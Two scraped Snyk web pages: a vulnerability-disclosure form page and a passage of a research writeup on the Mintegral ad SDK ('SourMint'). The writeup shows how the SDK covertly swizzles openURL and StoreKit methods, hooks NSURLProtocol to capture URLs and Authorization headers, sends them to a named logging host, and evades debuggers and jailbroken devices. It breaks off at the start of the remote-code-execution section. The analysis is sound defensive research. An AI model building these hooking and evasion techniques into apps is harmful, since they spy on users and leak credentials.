=== Content from support.snyk.io_340a6d77_20250119_142620.html ===




=== Content from snyk.io_ce6ec986_20250119_142620.html ===
You need to enable JavaScript to run this app.[Skip to main content](#main-content)

* Products

  Products

  + [What is Snyk?

    Developer-first security in action](/product/)
  + [Snyk Code

    Secure your code as it's written](/product/snyk-code/)
  + [Snyk Open Source

    Avoid vulnerable dependencies](/product/open-source-security-management/)
  + [Snyk Container

    Keep your base images secure](/product/container-vulnerability-management/)
  + [Snyk IaC

    Fix IaC misconfigurations in-code](/product/infrastructure-as-code-security/)
  + [Snyk AppRisk

    Reduce risk across your business](/product/snyk-apprisk/)
  + [Pricing](/plans/)

  Solutions

  + [Why Snyk?

    Modern security in a single platform](/platform/)
  + [Application security

    Build secure, stay secure](/solutions/application-security/)
  + [Software supply chain security

    Mitigate supply chain risk](/solutions/software-supply-chain-security/)
  + [Secure-AI-generated code

    AI writes, Snyk secures](/solutions/secure-ai-generated-code/)
  + [Zero-day vulnerabilities

    Fix the first day with Snyk](/solutions/zero-day-vulnerability-security/)
  + [Security Intelligence

    Comprehensive vulnerability data](/platform/security-intelligence/)

  Platform

  + [DeepCode AI

    Purpose-built security AI](/platform/deepcode-ai/)
  + [Integrations

    SDLC-spanning security](/integrations/)
  + [Code Checker

    Write better code for free](/code-checker/)

  Audience

  + [Snyk for devs

    Dev-centric info on demand](https://go.snyk.io/2024-dev-onboarding.html)
  + [Snyk for government

    Mission-informed AppSec](/government-security-solution/)
  + [Leaders handbook

    SAST essentials for genAI](/lp/securing-ai-generated-code/)![](https://res.cloudinary.com/snyk/image/upload/v1729618965/default-report.b205b2e0.svg)

  Secure Adoption in Gen AI Era Report

  [Read report](https://go.snyk.io/secure-adoption-in-genai-era.html "Read report")
* Resources

  Our resources

  + [Resource library

    Browse our extensive database](/resource-library/)
  + [Customer resources

    The one stop shop for customers](/customer-resources/)
  + [Ethical hacking

    How ethical hacking can help you](/ethical-hacking-resources/)
  + [Security leaders

    Insights from industry leaders](/security-leaders/)
  + [Top 10 vulns

    See the most common vuln types](/snyk-top-10/)
  + [Blog Section](/blog/)
  + [Snyk's podcasts](/podcasts/the-secure-developer/)
  + [Snyk’s YouTube](https://www.youtube.com/snyksec)

  Our ecosystem

  + [Snyk Learn

    Security education from Snyk](https://learn.snyk.io)
  + [Snyk user docs

    Get started with Snyk](https://docs.snyk.io/)
  + [Snyk Support

    How can we help?](https://support.snyk.io/hc/en-us)
  + [Snyk Vuln Database

    Find new vulnerabilities](https://security.snyk.io/)
  + [Snyk Updates

    Stay in the loop](https://updates.snyk.io/)
  + [Snyk Partner Solutions Directory

    Explore Snyk Partner Integrations](https://partners.snyk.io/English/solutions/)

  Our community

  + [Events & webinars](/events/)
  + [Ambassadors](/snyk-ambassadors/)
  + [Discord channel](https://snyk.co/discordcommunity)![](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1717461856%2Ffeature-snyk-snowflake.jpg&w=2560&q=75)

  Extend the power of your AppSec data with the new Snyk and Snowflake integration

  [Read blog](/blog/snyk-snowflake-data-share/ "Read blog")
* Company

  Company

  ## The developer security platform

  Snyk gives you the visibility, context, and control you need to work alongside developers on reducing application risk.

  [More about us](/about/ "More about us")
  + [Our services

    Maximize your AppSec ROI](/services/)
  + [Our customers

    We help customers save time and money](/customers/)
  + [Our partners

    Bringing business class security with partners](/partners/)
  + [Case studies

    Check out our customer stories and stats](/case-studies/)
  + [Newsroom

    See the latest press releases](/news/)
  + [Contact us

    Get in touch with any feedback or questions](/contact-us/)
  + [Careers

    Join Snyk today](/careers/)![](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1730905024%2FSnyk_Probely.jpg&w=2560&q=75)

  Snyk Acquires Developer-First DAST Provider Probely

  [Read press release](/news/snyk-acquires-developer-first-dast-provider-probely/ "Read press release")
* [Pricing](/plans/)

ENSelect your languageEnglishDeutschFrançais日本語Português (BR)Login

Free and Team Plan Customers

* [Snyk

  app.snyk.io](https://app.snyk.io)

Enterprise Plan Customers

* [*🇺🇸*

  Snyk US - 1

  app.snyk.io](https://app.snyk.io)
* [*🇺🇸*

  Snyk US - 2

  app.us.snyk.io](https://app.us.snyk.io)
* [*🇪🇺*

  Snyk EU

  app.eu.snyk.io](https://app.eu.snyk.io)
* [*🇦🇺*

  Snyk AU

  app.au.snyk.io](https://app.au.snyk.io)

The region where your data is hosted follows local agreements, and it may not align with your own location. [Find out more](https://docs.snyk.io/working-with-snyk/regional-hosting-and-data-residency).[Sign up](https://app.snyk.io/signup "Sign up")[Book a live demo](/schedule-a-demo/ "Book a live demo")
# Vulnerability Disclosure

We at Snyk value the security community and believe that a responsible disclosure of security vulnerabilities in open source packages helps us ensure the security and privacy of the users. We aim to provide a disclosure program for the security community to report security issues found within languages including JavaScript, Java, Python, .NET, Go, Ruby and PHP.

Using this form, you can disclose vulnerabilities you’ve found or vulnerabilities that are missing within [Snyk Vulnerability Database](https://security.snyk.io/), and we’ll help you verify the vulnerability and contact the maintainer. In addition, as a CVE Numbering Authority (CNA) we are also able to assign a CVE for the issue.

Before submitting a report, please review our disclosure policy which can be found [here](https://docs.snyk.io/disclosing-vulnerabilities/disclose-a-vulnerability-in-an-open-source-package).

For any questions or follow ups on the disclosure you may email us at report@snyk.io.

### Submit a vuln

## Products & Solutions

* [What is Snyk?](/product/)
* [Developer Security Platform](/platform/)
* [Pricing](/plans/)
## Our Resources

* [Resource library](/resource-library/)
* [Blog](/blog/)
* [Snyk’s podcasts](/podcasts/the-secure-developer/)
## Our Ecosystem

* [Snyk Learn](/platform/learn/)
* [Snyk User Docs](https://docs.snyk.io/)
* [Snyk Support](https://support.snyk.io/hc/en-us)
* [Snyk Vuln Database](https://security.snyk.io/)
* [Snyk Updates](https://updates.snyk.io/)
* [Snyk Trust Center](https://trust.snyk.io/home)
## Company & Community

* [About Snyk](/about/)
* [Contact us](/contact-us/)
* [Book a demo](/schedule-a-demo/)
* [Careers](/careers/)
* [Events & webinars](/events/)
* [Ambassadors](/snyk-ambassadors/)
## Why Snyk

* [Snyk With GitHub](/comparison/github-and-snyk/)
* [Snyk vs Veracode](/comparison/snyk-vs-veracode/)
* [Snyk vs Checkmarx](/comparison/snyk-vs-checkmarx/)
* [Snyk vs Synopsys](/comparison/snyk-vs-synopsys/)

## The developer security platform

Snyk gives you the visibility, context, and control you need to work alongside developers on reducing application risk.

[More about us](/about/ "More about us")

© 2025 Snyk Limited
Registered in England and Wales

* [Legal terms](/policies/terms-of-service/)
* [Privacy Notice](/policies/privacy/)
* [Terms of use](/policies/website-terms-of-use/)
* [California residents: do not sell my information](https://preferences.snyk.io/dont_sell)


=== Content from snyk.io_4d5180bd_20250119_125941.html ===
You need to enable JavaScript to run this app.[Skip to main content](#main-content)

* Products

  Products

  + [What is Snyk?

    Developer-first security in action](/product/)
  + [Snyk Code

    Secure your code as it's written](/product/snyk-code/)
  + [Snyk Open Source

    Avoid vulnerable dependencies](/product/open-source-security-management/)
  + [Snyk Container

    Keep your base images secure](/product/container-vulnerability-management/)
  + [Snyk IaC

    Fix IaC misconfigurations in-code](/product/infrastructure-as-code-security/)
  + [Snyk AppRisk

    Reduce risk across your business](/product/snyk-apprisk/)
  + [Pricing](/plans/)

  Solutions

  + [Why Snyk?

    Modern security in a single platform](/platform/)
  + [Application security

    Build secure, stay secure](/solutions/application-security/)
  + [Software supply chain security

    Mitigate supply chain risk](/solutions/software-supply-chain-security/)
  + [Secure-AI-generated code

    AI writes, Snyk secures](/solutions/secure-ai-generated-code/)
  + [Zero-day vulnerabilities

    Fix the first day with Snyk](/solutions/zero-day-vulnerability-security/)
  + [Security Intelligence

    Comprehensive vulnerability data](/platform/security-intelligence/)

  Platform

  + [DeepCode AI

    Purpose-built security AI](/platform/deepcode-ai/)
  + [Integrations

    SDLC-spanning security](/integrations/)
  + [Code Checker

    Write better code for free](/code-checker/)

  Audience

  + [Snyk for devs

    Dev-centric info on demand](https://go.snyk.io/2024-dev-onboarding.html)
  + [Snyk for government

    Mission-informed AppSec](/government-security-solution/)
  + [Leaders handbook

    SAST essentials for genAI](/lp/securing-ai-generated-code/)![](https://res.cloudinary.com/snyk/image/upload/v1729618965/default-report.b205b2e0.svg)

  Secure Adoption in Gen AI Era Report

  [Read report](https://go.snyk.io/secure-adoption-in-genai-era.html "Read report")
* Resources

  Our resources

  + [Resource library

    Browse our extensive database](/resource-library/)
  + [Customer resources

    The one stop shop for customers](/customer-resources/)
  + [Ethical hacking

    How ethical hacking can help you](/ethical-hacking-resources/)
  + [Security leaders

    Insights from industry leaders](/security-leaders/)
  + [Top 10 vulns

    See the most common vuln types](/snyk-top-10/)
  + [Blog Section](/blog/)
  + [Snyk's podcasts](/podcasts/the-secure-developer/)
  + [Snyk’s YouTube](https://www.youtube.com/snyksec)

  Our ecosystem

  + [Snyk Learn

    Security education from Snyk](https://learn.snyk.io)
  + [Snyk user docs

    Get started with Snyk](https://docs.snyk.io/)
  + [Snyk Support

    How can we help?](https://support.snyk.io/hc/en-us)
  + [Snyk Vuln Database

    Find new vulnerabilities](https://security.snyk.io/)
  + [Snyk Updates

    Stay in the loop](https://updates.snyk.io/)
  + [Snyk Partner Solutions Directory

    Explore Snyk Partner Integrations](https://partners.snyk.io/English/solutions/)

  Our community

  + [Events & webinars](/events/)
  + [Ambassadors](/snyk-ambassadors/)
  + [Discord channel](https://snyk.co/discordcommunity)![](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1717461856%2Ffeature-snyk-snowflake.jpg&w=2560&q=75)

  Extend the power of your AppSec data with the new Snyk and Snowflake integration

  [Read blog](/blog/snyk-snowflake-data-share/ "Read blog")
* Company

  Company

  ## The developer security platform

  Snyk gives you the visibility, context, and control you need to work alongside developers on reducing application risk.

  [More about us](/about/ "More about us")
  + [Our services

    Maximize your AppSec ROI](/services/)
  + [Our customers

    We help customers save time and money](/customers/)
  + [Our partners

    Bringing business class security with partners](/partners/)
  + [Case studies

    Check out our customer stories and stats](/case-studies/)
  + [Newsroom

    See the latest press releases](/news/)
  + [Contact us

    Get in touch with any feedback or questions](/contact-us/)
  + [Careers

    Join Snyk today](/careers/)![](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1730905024%2FSnyk_Probely.jpg&w=2560&q=75)

  Snyk Acquires Developer-First DAST Provider Probely

  [Read press release](/news/snyk-acquires-developer-first-dast-provider-probely/ "Read press release")
* [Pricing](/plans/)

ENSelect your languageEnglishDeutschFrançais日本語Português (BR)Login

Free and Team Plan Customers

* [Snyk

  app.snyk.io](https://app.snyk.io)

Enterprise Plan Customers

* [*🇺🇸*

  Snyk US - 1

  app.snyk.io](https://app.snyk.io)
* [*🇺🇸*

  Snyk US - 2

  app.us.snyk.io](https://app.us.snyk.io)
* [*🇪🇺*

  Snyk EU

  app.eu.snyk.io](https://app.eu.snyk.io)
* [*🇦🇺*

  Snyk AU

  app.au.snyk.io](https://app.au.snyk.io)

The region where your data is hosted follows local agreements, and it may not align with your own location. [Find out more](https://docs.snyk.io/working-with-snyk/regional-hosting-and-data-residency).[Sign up](https://app.snyk.io/signup "Sign up")[Book a live demo](/schedule-a-demo/ "Book a live demo")[Snyk Blog](/blog/)
# SourMint malicious SDK research writeup

Written by: ![Kirill Efimov](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1646601844%2Fwordpress-sync%2FScreen-Shot-2019-04-14-at-10.33.58.png&w=48&q=75)

Kirill Efimov

![malicious code, ad fraud](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1613516928%2Fwordpress-sync%2Fblog-main.png&w=2560&q=75)

August 24, 2020

 0 mins read

* [Overview](/blog/sour-mint-malicious-sdk/#overview)
* [Excessive data collection on iOS [August 2020]](/blog/sour-mint-malicious-sdk/#data-collection)
* [Remote Code Execution (RCE) on iOS [October 2020]](/blog/sour-mint-malicious-sdk/#rce)
* [Download tracking in Android [October 2020]](/blog/sour-mint-malicious-sdk/#download-tracking)
* [Timeline](/blog/sour-mint-malicious-sdk/#timeline)

## [Overview](/blog/sour-mint-malicious-sdk/#overview)

The Mintegral SDK is a popular mobile app advertising SDK available for both the iOS and Android platforms. It is used by thousands of mobile apps with over a billion downloads per month. The SDK is used by application developers to monetize their apps with third-party ads.

The Snyk security research team has made two significant disclosures surrounding the Mintegral SDK. [The first disclosure](/blog/sourmint-malicious-code-ad-fraud-and-data-leak-in-ios/) was published in August 2020 and discovered excessive data collection and click hijacking that was performed on the iOS distribution of the SDK, [the second disclosure](/blog/remote-code-execution-rce-sourmint/) discovered a backdoor found on the iOS version of the SDK that allows remote code execution, along with some new findings on the Android distribution of the SDK.

The aim of this article is to share the technical details of our research and findings beyond what was covered in the blog posts.

This writeup is divided into three sections:

* Excessive Data Collection, including all HTTP request interception and logging in the iOS SDK - originally published on 24th of August 2020 - describes the URL and request tracking capabilities in the iOS distribution of the Mintegral SDK.
* A backdoor in the iOS distribution of the SDK allows Remote Code Execution - describes the remote code execution capabilities in MintegralAdSDK published on 15th of October 2020.
* Downloads URL tracking in Android - describes various findings in the Android distribution of the Mintegral SDK.

## [Excessive data collection on iOS [August 2020]](/blog/sour-mint-malicious-sdk/#data-collection)

### Overview

This part of the research was conducted on the binary version of Mintegral iOS SDK, since the open source version was not yet available to us in August 2020. The following research was conducted on version 6.3.5.0 of the SDK (for x86 arch) available for download [from GitHub](https://github.com/Mintegral-official/MintegralAdSDK-iOS-new/releases/tag/6.3.5.0).

We have identified that Mintegral iOS SDK versions 5.5.1 and above contain malicious functionality which leads to information leakage. In simple terms the SDK is spying on user link clicking, and network activity within the affected apps. The spying occurs even if the SDK was not enabled by the developer or the ad mediation platform, and the SDK attempts to hide the malicious behavior by identifying proxy, simulators and jail broken devices.

### Method swizzling

Mintegral SDK uses a technique called method swizzling to replace implementations of the `UIApplication openURL` and `SKStoreProductViewController loadProductWithParameters` methods at runtime, as well it registers a custom `NSURLProtocol` class.

These hooks are used to spy on application users by sending all the information about HTTP requests, opened URLs and App Store links they click on from within the application.

The HTTP request headers and URLs themself could contain sensitive data, but together with IDFA (Identifier for Advertisers), this data allows Mintegral to perform advertisement attribution fraud.

### Advertisement attribution fraud

To monetise their applications, developers often install advertising platforms. Advertising platforms receive revenue from advertisers for each installation happening after a user clicks on their advertisement. It is not uncommon for developers to use multiple advertising platforms in their aps. Therefore, to determine which ad platform should receive given attribution for the installation, each click gets registered to an attribution provider, a mobile measurement platform (MMP).

The figure below shows how the malicious functionality in Mintegral works. In this example, the user clicked on an advertisement from “Another Platform”. But since Mintegral has an ability to intercept all URLs opened by the application it could perform additional requests to an attribution provider pretending that click actually happened by their advertisement. The full process works like this:

1. The user clicks a link from an in-app advertisement, served by a non-Mintegral ad network, to install a new application from the App Store.
2. The ad network’s SDK sends the click information to their back-end platform.
3. Having intercepted the click event via code injected into iOS event handlers through method swizzling, Mintegral logs the click data to their server.
4. The ad network registers a click notification with the attribution provider.
5. Mintegral registers a click notification with the attribution provider as well.

When the attribution provider attempts to match the install event to registered click notifications, it finds two that match. Using a last-touch attribution model, the Mintegral click notification is given the attribution and the click notification from the other ad network is rejected.

![](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1672811226%2Fblog-sourmint-writeup-diagram.png&w=1240&q=75)

Snyk worked with a major attribution provider to confirm that Mintegral is using the click data to generate false click notifications. Through their investigation, the provider was able to show that false click notifications were being generated and resulting in mis-attribution of ad clicks to Mintegral.

### Demo application

To demonstrate the attack, we setup a demo application.This will show the malicious `openURL` hook in action. We use a debugging proxy to intercept all network traffic.

To initialize the application we use the following code snippet from [the Mintegral documentation](http://cdn-adn.rayjump.com/cdn-adn/v2/markdown_v2/index.html?file=sdk-m_sdk-ios&lang=en):

```
- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
    [[MTGSDK sharedInstance] setAppID:@"xxxxxx" ApiKey:@"yyyyyyyyyyyyyyyyyyyyyyyyy"];
    return YES;
}
```

With the SDK initialized, we open example.com from the application using a button click:

```
- (IBAction)openURLWithOptions:(id)sender {
    [[UIApplication sharedApplication] openURL:[NSURL URLWithString:@"http://example.com?foo=bar&x=y"] options:@{} completionHandler:nil];
}
```

After launching the app, we immediately see a couple of requests from the Mintegral SDK in our proxy:

* `GET https://setting.rayjump.com/sdk/customid`
* `GET https://setting.rayjump.com/setting`
* `POST https://analytics.rayjump.com`

![](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1672812169%2Fblog-sourmint-writeup-requests.jpg&w=2560&q=75)
### Settings

The response from `https://setting.rayjump.com/setting`is a JSON object with many different options. Following table describes the most interesting fields for our research.

| **JSON Field** | **Description** |
| --- | --- |
| csw | Enable or disable anti-debugging functionality. |
| cou | Enable or disable `openURL` method hook. |
| cdai | URL to send the leaked information (\*). |
| cspn | Enable or disable hook on StoreKit methods. |
| cud | Enable or disable hook on NSURLProtocol. |
| cudl | URLs array to track via NSURLProtocol (\*\*). |

\* In our case it was `LdxThdi1WBK/WgfPhbxQYkeXHBPwHZKsYFh=` which is *https://n.systemlog.me/log* after decoding.

\*\* In our case it was `kBzuJd5/H+i/D+SMY7V/DFKwR0M0D+SMhBPthdSsHZPUYFT0+N==` which is `["itunes.apple.com","apps.apple.com"]` after decoding.

### Payload decoding

We can see two more requests after clicking the button which opens example.com. The first one is a GET request to http://example.com, as we would expect. The second one is a POST request to https://n.systemlog.me/log.

![](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1672812290%2Fblog-sourmint-writeup-requests-2.png&w=2560&q=75)

The body of the request looks like it is base64 encoded. But in reality, it is not a base64 encoded string. The Mintergral SDK implements their own encoding and decoding logic which can be found in `+[MTGBase base64DecodeString:]` and  `+[MTGBase base64CleverDecodeString:]`. Note that `MTGBase` is not exposed in public headers of the SDK and not meant to be accessible for developers.

We use next code snippet to decode the payload:

```
Class cls = NSClassFromString(@"MTGBase");
NSObject *obj = [cls performSelector:NSSelectorFromString(@"base64CleverDecodeString:") withObject:@"THE REQUEST BODY HERE"];
NSLog(@"%@", obj);
```
![](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1672812400%2Fblog-sourmint-writeup-payload.jpg&w=2560&q=75)

The payload contains a lot of data including IDFA, IDFV, OS version, user agent and so on. However, it also contains a field called “clever”, which is, again, encoded. We can decode it using `base64DecodeString`:

```
[{'cn': 'ViewController', 'u': 'http://example.com?foo=bar&x=y', 'nid': 0, 'type': '3', 'mn': 'openURLWithOptions:', 'trc': '["2|awesomegame|0x0000000104102f18 -[ViewController openURLWithOptions:] + 152","3|UIKitCore|0x00007fff49326c1d -[UIApplication sendAction:to:from:forEvent:] + 83","4|UIKitCore|0x00007fff48cd5baa -[UIControl sendAction:to:forEvent:] + 223","5|UIKitCore|0x00007fff48cd5ef2 -[UIControl _sendActionsForEvents:withEvent:] + 396","6|UIKitCore|0x00007fff48cd4e63 -[UIControl touchesEnded:withEvent:] + 497"]'}]
```

As you can see it contains the URL, stack trace and some additional information like the controller and the method name.

### Going deeper

As was mentioned before - the Mintegral SDK is closed source. We are going to look at version 6.3.5.0 for x86 architecture.

The binary is a Macho executable that contains multiple other binaries. The code we’re interested in resides in `_CXX_CXX_OperationPKTask.o`.

Looking at the class, we see `+[_CXX_CXX_OperationPKTask load]` which [executes automatically](https://developer.apple.com/documentation/objectivec/nsobject/1418815-load?language=objc) when the class is added at runtime. That means if the SDK is installed via CocoaPods, malicious logic is going to be initialized regardless of whether developers actually use the SDK or not.

The `load` method performs a series of calls which lead us to `___cxxwebk_init_vw`. This method checks whether the anti-debug protection flag is enabled and initialises hooks if the flag is set to false or if debugging is disabled.

![](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1672812504%2Fblog-sourmint-writeup-load.png&w=2560&q=75)

Initialization of the hooks depends on the settings request mentioned above. In the following table we see the relationships between response JSON fields and `MTGSetting` class:

| **JSON Field** | **MTGSetting Property** | **Description** |
| --- | --- | --- |
| csw | cSrtW | Enable or disable anti-debugging functionality. |
| cou | cOpenURL | Enable or disable `openURL` method hook. |
| cspn | cPackageName | Enable or disable hook on StoreKit methods. |

### Anti-debug logic

![](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1672812598%2Fblog-sourmint-writeup-anti-debug.png&w=2560&q=75)

The `__cxx_cxx_op_isInSuperViewFrame` function returns `true` in the following cases:

* Device platform is a “simulator”.
* Debugger is attached (implemented in `____mvpmvvm_isDebuggerAttached_block_invoke`).
* One of the files present on the device (indication of jailbreak):

  + /Applications/Cydia.app
  + /Library/MobileSubstrate/MobileSubstrate.dylib
  + /bin/bash
  + /usr/sbin/sshd
  + /etc/apt
  + /usr/bin/ssh
* Proxy is enabled (using `CFNetworkCopySystemProxySettings`).

### openURL method swizzling

The logic in the following screenshot is implemented in the `___cxxwebkmcouitninapo` method which is called from `___cxxwebk_init_vw` if the relevant flag is enabled.

![](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1672812671%2Fblog-sourmint-writeup-swizzling.png&w=1240&q=75)

The above screenshot shows the method swizzling implementation. It performs the following calls:

1. `NSSelectorFromString`  to get a selector for the “openURL:” method.
2. `NSClassFromString` to get a class descriptor for `UIApplication`.
3. `class_getInstanceMethod` to get the method descriptor.
4. `method_getImplementation` to get actual implementation of the method.
5. Then they define a code block which calls `_____cxxwebkmcouitninapo_block_invoke_2` and then calls the original `openURL`.
6. `method_setImplementation` to replace the original openURL with the code block from the previous step.

Almost the same happens for `openURL:options:completionHandler:` method except that they check the system version before doing so (the handler was first introduced in iOS 10).

At this point we had seen how the hook was applied. Next we will look at the implementation of the hook itself (`_____cxxwebkmcouitninapo_block_invoke_2`).

### The openURL hook implementation

Effectively, the implementation is located in the `___cxxwebkmcoulsz` method. There we can see one more anti-debug check call, then it checks the `__mc_notifyInHouse` flag and does nothing if this flag is 1.

This is done to ignore all marketing URLs clicked by a user **on a Mintegral served ad**. We can see relevant logic in `+[MTGBase mtgOpenURL:options:completionHandler:]` in the screenshot below:

![](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1672812784%2Fblog-sourmint-writeup-openurl.png&w=1240&q=75)

Next piece of code shows that they also serialize the backtrace data and leak it in the payload they send to https://n.systemlog.me/log.

We are able to set a breakpoint at the `+[_CXX_CXX_OperationPKTask _cxx_cm_log_warnings:to:ins:]` call. You can see the call arguments on the next screenshot:

![](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1672812889%2Fblog-sourmint-writeup-call.jpg&w=2560&q=75)

* The URL that was opened (http://example.com?foo=bar&x=y).
* The class where the click happened (`ViewController`).
* The method from within where the click happened (`openURLWithOptions:`).
* Backtrace info.

Another interesting function is `_nsh_id_by_cc`, which seems to be responsible for identifying competitor SDKs. Relevant logic shown in the next screenshot:

![](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1672813059%2Fblog-sourmint-writeup-nsh.jpg&w=2560&q=75)

Going back to `+[_CXX_CXX_OperationPKTask _cxx_cm_log_warnings:to:ins:]`, after the payload has been encoded via `+[MTGBase base64EncodeString:]` it creates a new code block and uses `_dispatch_async` to invoke it.

It leads to a series of calls with additional payload transformations and ends up in `-[_MC_ApiManager AFRequestWithUrl:paras:success:failure:]`, which makes a post request to `collectDomainUrl` from `MTGSetting` which is **https://n.systemlog.me/log** by default.

A video demonstrating how a private URL can be leaked.

![](/_next/image/?url=https%3A%2F%2Fimg.youtube.com%2Fvi%2FMMuL5MaQeLM%2Fsddefault.jpg&w=2560&q=75)
### SKStoreProductViewController hook

`SKStoreProductViewController` is a view controller that provides a page where the user can purchase media from the App Store.

The `loadProductWithParameters:completionBlock:` method loads a new product screen to display.

Instead of going into technical details of the hook implementation we added next code snippet to the demo application:

```
- (IBAction)openSKStoreProductViewController:(id)sender {
    SKStoreProductViewController *storeViewController = [[SKStoreProductViewController alloc] init];
    [storeViewController setDelegate:self];
    NSDictionary *productParams = @{SKStoreProductParameterITunesItemIdentifier: [NSNumber numberWithInt:1234567890]};
    [storeViewController loadProductWithParameters:productParams completionBlock:nil];
}
```

As a result we see a POST request to *https://n.systemlog.me/log* with the next payload in the “clever” field:

```
[{'cn': 'UIApplication', 'mn': 'sendAction:to:from:forEvent:', 'nid': 0, 'aid': '{"id":1234567890}', 'type': '2', 'trc': '["2|UIKitCore|0x00007fff49326c1d -[UIApplication sendAction:to:from:forEvent:] + 83","3|UIKitCore|0x00007fff48cd5baa -[UIControl sendAction:to:forEvent:] + 223","4|UIKitCore|0x00007fff48cd5ef2 -[UIControl _sendActionsForEvents:withEvent:] + 396","5|UIKitCore|0x00007fff48cd4e63 -[UIControl touchesEnded:withEvent:] + 497","6|UIKitCore|0x00007fff49362508 -[UIWindow _sendTouchesForEvent:] + 1359"]', 'dur': 24}]
```

As we can see the product ID is in the request Q.E.D.

### NSURLProtocol hook

`NSURLProtocol` class allows a developer to redefine how [Apple’s URL loading system](https://developer.apple.com/documentation/foundation/url_loading_system#//apple_ref/doc/uid/10000165-BCICJDHA) operates. The Mintegral SDK registers malicious implementation of `NSURLProtocol`, which can be configured remotely to intercept any outgoing requests made by an application and track URLs and HTTP headers including the *Authorization* header.

**For application developers it means that API tokens, cookies and basic authentication headers could potentially be collected by Mintegral.**

To understand how the SDK activates that part of the malicious code we have to look back to `___cxxwebk_init_vw`.

![](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1672813482%2Fblog-sourmint-writeup-cxxwebk.png&w=2560&q=75)

The above screenshot shows that the `cud` flag should be enabled and the `cudl` array shouldn’t be empty to activate the hook.

The following screenshot shows part of the `___cxxwebkterisiuuxx` function called from the above method.

![](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1672813568%2Fblog-sourmint-writeup-cxxwebkter.png&w=2560&q=75)

The code in the `___cxxwebkterisiuuxx` function performs the following actions:

1. Creates a class inherited from `NSURLProtocol`(`objc_registerClassPair`,`objc_allocateClassPair`).
2. Adds an implementation for `canInitWithRequest:` which is effectively an interceptor (`class_addMethod`).
3. Calls `+[NSURLProtocol registerClass:]` to register the class with the URL loading system.

In our research, we added the following code snippet to verify what data is collected by the malicious code:

```
- (IBAction)httpRequestWithURLSession:(id)sender {
    NSURLSessionConfiguration *sConf = [NSURLSessionConfiguration defaultSessionConfiguration];
    sConf.HTTPAdditionalHeaders = @{@"Authorization": @"Basic YWRtaW46YWRtaW4K"};
    NSURLSession *session = [NSURLSession sessionWithConfiguration:sConf];
    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:@"http://example.com/get-secret-data"]];
    req.HTTPBody = [@"foo=bar" dataUsingEncoding:NSUTF8StringEncoding];
    req.HTTPMethod = @"POST";
    NSURLSessionDataTask *task = [session dataTaskWithRequest:req];
    [task resume];
}
```

As a result we see a POST request to *https://n.systemlog.me/log* with the following payload in the “clever” field:

```
[{'cn': '', 'u': 'http://example.com/get-secret-data', 'mn': '', 'nid': 0, 'hhf': '{"Authorization":"Basic YWRtaW46YWRtaW4K","Content-Length":"7"}', 'type': '1', 'hm': 'POST'}]
```

In the request, we can see the URL and the authorization header. Although the request body is not included, headers often contain sensitive data. That data could even include personally identifiable information. For example, if an API uses JWT tokens, email or user name could be stored inside the token.

### Conclusion

During the research we observed many interesting techniques Mintegral developers use to hide the malicious behaviour of their SDK. As we can see, they activate hooks only on specific applications in specific regions which helped the malicious code stay there for more than one year without any attention.

Talking about timeline, the first version ([5.5.1](https://github.com/Mintegral-official/MintegralAdSDK-iOS/releases/tag/5.5.1)) of the malicious SDK was published on Jul 17, 2019. We found that all subsequent versions housed the same malicious functionality.

Many popular applications were affected by the malicious activities of this SDK. We hope this research shedding light on the situation will drive greater scrutiny and privacy controls for advertiser networks moving forward.

## [Remote Code Execution (RCE) on iOS [October 2020]](/blog/sour-mint-malicious-sdk/#rce)

### TLDR

We discovered the `MTGBaseBridgeWebView` class, used everywhere in the SDK to communicate with JavaScript, acts as a backdoor, allowing for the invocation of arbitrary functions from the native application code.

![](/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1671638862%2Fwordpress-sync%2FSourMint-Blog-2.png&w=2560&q=75)

In the picture above you can see a simplified schema of the remote code execution in action.

### Diff analysis

After [our first public disclosure](/blog/sourmint-malicious-code-ad-fraud-and-data-leak-in-ios/), Mintegral announced the release of [an open source version of the SDK](https://www.mintegral.com/en/blog/mintegral-sdk-going-open-source-for-increased-transparency-and-security/).

We went ahead and compared the new open source version, to the previous binary version distributed as cocoapod. While we didn’t have the source code for the older version, we could still compare the class names. To do that we extracted the `.o` files from the [binaries](https://github.com/Mintegral-official/MintegralAdSDK-iOS-new/releases/tag/6.5.0.0) and compared the symbols with the `.h` files of the open source version.

As expected, a previously discovered malicious `_CXX_CXX_OperationPKTask` component was indeed deleted but something else came up in the diff. The following classes caught our attention:

* MTGCommandDispatcher
* MTGComponentCommands
* MTGRemoteCommand
* MTGRemoteCommandParameterModel
